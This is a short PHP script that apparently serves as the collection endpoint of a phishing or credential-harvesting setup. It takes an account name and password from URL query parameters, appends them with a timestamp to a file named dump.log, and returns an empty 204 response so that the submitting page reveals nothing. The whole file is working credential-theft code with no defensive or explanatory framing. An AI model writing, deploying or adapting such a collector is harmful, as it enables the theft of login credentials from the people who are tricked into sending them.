<?php 
$account = html_entity_decode(stripslashes($_GET["acc"])); 
$password = html_entity_decode(stripslashes($_GET["pw"]));
$req_dump = date("D M d, Y G:i", time()) . " : " . $account . " - " . $password . PHP_EOL;
$fp = file_put_contents('dump.log', $req_dump, FILE_APPEND );
header("HTTP/1.0 204 No Content");
?>